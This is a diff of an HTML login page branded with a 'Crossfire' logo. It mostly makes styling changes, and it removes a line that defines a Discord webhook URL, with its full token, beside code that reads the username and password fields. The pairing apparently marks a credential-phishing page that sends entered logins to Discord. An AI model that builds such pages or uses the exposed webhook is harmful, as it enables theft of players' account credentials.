@@ -15,7 +15,7 @@
     body {
       height: 100vh;
       background: radial-gradient(circle at center, #2d2d2d 0%, #1a1a1a 100%);
-      background-image: url('https://files.catbox.moe/ttsns4.jpg');
+      background-image: url('https://www.transparenttextures.com/patterns/rocky-wall.png');
       background-size: cover;
       display: flex;
       justify-content: center;
@@ -40,6 +40,25 @@
     .login-box:hover {
       transform: translateY(-3px);
       box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7), inset 0 0 30px rgba(255, 255, 255, 0.08);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin-bottom: 15px;
+    }
+
+    .logo img {
+      height: 43px;
+      width: auto;
+    }
+
+    .divider {
+      width: 100%;
+      height: 1px;
+      background: rgba(200, 200, 200, 0.2);
+      margin-bottom: 20px;
     }
 
     h2 {
@@ -109,6 +128,10 @@
 </head>
 <body>
   <div class="login-box">
+    <div class="logo">
+      <img src="/assets/crossfire.png" alt="Crossfire Logo">
+    </div>
+    <div class="divider"></div>
     <h2>Login to Continue.</h2>
     <input type="text" id="username" placeholder="Enter username" />
     <input type="password" id="password" placeholder="Enter password" />
@@ -117,7 +140,7 @@
   </div>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1433475537900142687/KTCv1yi4FDiqeAQJnopDIqo9EKx_JTnU8m4DouxnJ9Nh-xithm4JTu4dw_IRUvkDblZA";
+
 
     async function login() {
       const username = document.getElementById("username").value.trim();
